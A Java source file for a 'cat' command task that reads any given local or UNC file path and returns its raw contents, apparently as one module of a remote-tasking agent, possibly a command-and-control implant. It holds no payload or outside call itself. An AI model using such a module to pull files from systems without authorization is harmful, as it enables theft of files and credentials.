package com.woopsie.tasks;

import com.fasterxml.jackson.databind.JsonNode;
import com.woopsie.Config;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

/**
 * Cat file task - reads and returns file contents
 */
public class CatTask implements Task {
    
    @Override
    public String execute(Config config, JsonNode parameters) throws Exception {
        // Extract path parameter
        String path = parameters.has("path") ? parameters.get("path").asText() : "";
        
        if (path.isEmpty()) {
            throw new Exception("path parameter is required");
        }
        
        Config.debugLog(config, "Cat request - path: '" + path + "'");
        
        // Resolve path
        boolean isUncPath = path.startsWith("\\\\");
        
        // Fix malformed UNC paths from JSON parsing: \\host becomes \host
        if (!isUncPath && path.startsWith("\\") && path.length() > 2 && path.charAt(1) != ':') {
            path = "\\" + path;
            isUncPath = true;
            Config.debugLog(config, "Fixed malformed UNC path: " + path);
        }
        
        Path filePath = Paths.get(path);
        Config.debugLog(config, "Initial path object: " + filePath);
        
        if (!filePath.isAbsolute()) {
            String cwd = System.getProperty("user.dir");
            filePath = Paths.get(cwd).resolve(path);
            Config.debugLog(config, "Resolved relative to CWD (" + cwd + "): " + filePath);
        }
        
        // For UNC paths, use original path string for error messages
        String pathForDisplay = isUncPath ? path : filePath.toAbsolutePath().toString();
        
        // Check if file exists
        if (!Files.exists(filePath)) {
            throw new Exception("File does not exist: " + pathForDisplay);
        }
        
        // Get real path
        filePath = filePath.toRealPath();
        Config.debugLog(config, "Real path: " + filePath);
        
        if (Files.isDirectory(filePath)) {
            throw new Exception("Path is a directory, not a file: " + path);
        }
        
        // Read file contents
        String fileContents = Files.readString(filePath);
        Config.debugLog(config, "Read " + fileContents.length() + " characters from file");
        
        // Return raw file contents - CommunicationHandler will wrap it
        return fileContents;
    }
    
    @Override
    public String getCommandName() {
        return "cat";
    }
}
